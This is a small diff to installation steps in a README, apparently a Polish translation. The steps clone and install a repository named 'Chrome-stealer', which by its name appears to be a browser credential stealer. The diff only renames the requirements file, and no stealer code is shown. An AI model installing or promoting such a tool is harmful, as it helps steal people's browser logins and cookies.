@@ -3,7 +3,7 @@
     ```
     git clone https://github.com/Plasmonix/Chrome-stealer
     cd Chrome-stealer
-    pip install -r requirements.txt
+    pip install -r wymagania.txt
     ```
 
 - #### 🛠 Ustawienia
